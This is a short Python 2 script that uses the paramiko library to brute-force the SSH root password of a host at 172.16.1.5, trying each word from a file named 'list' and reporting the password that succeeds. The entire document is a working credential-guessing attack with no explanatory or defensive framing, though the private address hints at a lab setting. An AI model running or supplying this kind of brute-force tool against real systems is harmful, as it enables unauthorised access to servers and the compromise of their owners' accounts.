#!/usr/bin/python
import paramiko

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open('list')
for word in f.readlines():
    passwd = word.strip()

    try:
    
        ssh.connect('172.16.1.5', username='root', password=passwd)

    except paramiko.ssh_exception.AuthenticationException:
        print "Trying:", passwd

    else:
        print "Password Found -->", passwd
        break

ssh.close()

